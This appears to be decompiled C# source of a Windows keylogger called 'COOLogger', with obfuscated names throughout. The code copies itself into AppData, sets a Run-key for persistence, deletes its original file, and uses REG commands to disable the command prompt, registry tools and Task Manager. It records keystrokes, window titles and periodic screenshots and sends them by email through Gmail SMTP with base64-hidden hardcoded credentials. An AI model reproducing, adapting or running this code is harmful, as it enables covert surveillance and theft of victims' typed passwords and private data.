using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class CJnzzPTWOmCueMP
{
	private static string jMQeaKXwwYgsVoU = "Y29uYUBhdmFsYW5lLm9yZw==";

	private static string rKjKVPhRnXinkvN = "azMxcHFtbngxMjM=";

	private static string bjktSMprYexGvbW = "smtp.gmail.com";

	private static int XVaLSZpQQgWYQpS = 587;

	private static string JnzzPTWOmCueMPj;

	private static string MQeaKXwwYgsVoUr;

	private static string KjKVPhRnXinkvNb;

	private static string jktSMprYexGvbWX;

	private static string VaLSZpQQgWYQpSw;

	private static string BvZbIchpfLUUSXu;

	private static int JlFkJamaYSkhEny = 900000;

	private static string OblHUItVrqSzRDH = null;

	private static object wucRlcTgraZNNow = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string EBMdezBKiPsIouO = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage WMrmnlqbUcGhSim = new MailMessage();

	private static SmtpClient jiyDGwWleOvxTvz = new SmtpClient();

	[AccessedThroughProperty("iyDGwWleOvxTvzO")]
	private static OYsHtgHdcFmEptT _iyDGwWleOvxTvzO;

	private static object yROkHfXTfwLgUdB = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox kxwNQTLjyrbKMgJ = new RichTextBox();

	private static OYsHtgHdcFmEptT iyDGwWleOvxTvzO
	{
		get
		{
			return _iyDGwWleOvxTvzO;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_iyDGwWleOvxTvzO != null)
			{
				OYsHtgHdcFmEptT.KeyDown -= uCJnzzPTWOmCueM;
			}
			_iyDGwWleOvxTvzO = value;
			if (_iyDGwWleOvxTvzO != null)
			{
				OYsHtgHdcFmEptT.KeyDown += uCJnzzPTWOmCueM;
			}
		}
	} = new OYsHtgHdcFmEptT();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cc: Expected O, but got Unknown
		//IL_02ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f5: Expected O, but got Unknown
		BvZbIchpfLUUSXu = Conversions.ToString(true);
		KjKVPhRnXinkvNb = Conversions.ToString(true);
		jktSMprYexGvbWX = Conversions.ToString(true);
		VaLSZpQQgWYQpSw = Conversions.ToString(true);
		MQeaKXwwYgsVoUr = Conversions.ToString(true);
		JnzzPTWOmCueMPj = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, wucRlcTgraZNNow, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(wucRlcTgraZNNow, (object)"\\MrmnlqbUcGhSimo.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(EBMdezBKiPsIouO + "\\MrmnlqbUcGhSimo.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(wucRlcTgraZNNow, (object)"\\"), yROkHfXTfwLgUdB))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(wucRlcTgraZNNow, (object)"\\"), yROkHfXTfwLgUdB)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(wucRlcTgraZNNow, (object)"\\"), yROkHfXTfwLgUdB)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(wucRlcTgraZNNow, (object)"\\"), yROkHfXTfwLgUdB)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(wucRlcTgraZNNow, (object)"\\"), yROkHfXTfwLgUdB) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(JnzzPTWOmCueMPj))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(yROkHfXTfwLgUdB)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(yROkHfXTfwLgUdB), Operators.ConcatenateObject(Operators.ConcatenateObject(wucRlcTgraZNNow, (object)"\\"), yROkHfXTfwLgUdB));
			}
		}
		if (Conversions.ToBoolean(MQeaKXwwYgsVoUr))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(wucRlcTgraZNNow, (object)"\\MrmnlqbUcGhSimo.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(KjKVPhRnXinkvNb))
		{
			Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(jktSMprYexGvbWX))
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(VaLSZpQQgWYQpSw))
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(900000);
		val.add_Tick((EventHandler)YsHtgHdcFmEptTt_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)FyROkHfXTfwLgUd_Ticked);
		val2.Start();
		iyDGwWleOvxTvzO.tFyROkHfXTfwLgU();
		Application.Run();
	}

	private static string UqPVRcfuQRbkfJY()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string PjMQeaKXwwYgsVo(string kkjnZfnEedtjmeD)
	{
		byte[] bytes = Convert.FromBase64String(kkjnZfnEedtjmeD);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void YsHtgHdcFmEptTt_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(BvZbIchpfLUUSXu))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = hrPKnpWpvEsYhig(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(wucRlcTgraZNNow, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(wucRlcTgraZNNow, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(PjMQeaKXwwYgsVo(jMQeaKXwwYgsVoU));
				mailMessage.To.Add(PjMQeaKXwwYgsVo(jMQeaKXwwYgsVoU));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = kxwNQTLjyrbKMgJ.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(PjMQeaKXwwYgsVo(jMQeaKXwwYgsVoU), PjMQeaKXwwYgsVo(rKjKVPhRnXinkvN));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				kxwNQTLjyrbKMgJ.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage wMrmnlqbUcGhSim = WMrmnlqbUcGhSim;
		wMrmnlqbUcGhSim.From = new MailAddress(PjMQeaKXwwYgsVo(jMQeaKXwwYgsVoU));
		wMrmnlqbUcGhSim.To.Add(PjMQeaKXwwYgsVo(jMQeaKXwwYgsVoU));
		wMrmnlqbUcGhSim.Subject = "COOLogger Logs from - " + Environment.UserName;
		wMrmnlqbUcGhSim.Body = kxwNQTLjyrbKMgJ.get_Text();
		wMrmnlqbUcGhSim = null;
		SmtpClient smtpClient2 = jiyDGwWleOvxTvz;
		smtpClient2.Host = "smtp.gmail.com";
		smtpClient2.Port = 587;
		smtpClient2.EnableSsl = true;
		smtpClient2.Credentials = new NetworkCredential(PjMQeaKXwwYgsVo(jMQeaKXwwYgsVoU), PjMQeaKXwwYgsVo(rKjKVPhRnXinkvN));
		smtpClient2.Send(WMrmnlqbUcGhSim);
		smtpClient2 = null;
		kxwNQTLjyrbKMgJ.set_Text("");
	}

	public static void uCJnzzPTWOmCueM(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox val = kxwNQTLjyrbKMgJ;
		val.set_Text(val.get_Text() + iyDGwWleOvxTvzO.dBvZbIchpfLUUSX(e));
	}

	public static void FyROkHfXTfwLgUd_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(OblHUItVrqSzRDH, UqPVRcfuQRbkfJY(), false) != 0)
		{
			OblHUItVrqSzRDH = UqPVRcfuQRbkfJY();
			if (Operators.CompareString(OblHUItVrqSzRDH, "", false) != 0)
			{
				RichTextBox val = kxwNQTLjyrbKMgJ;
				val.set_Text(val.get_Text() + "\r\n\r\n~~~~~" + OblHUItVrqSzRDH + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string hrPKnpWpvEsYhig(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
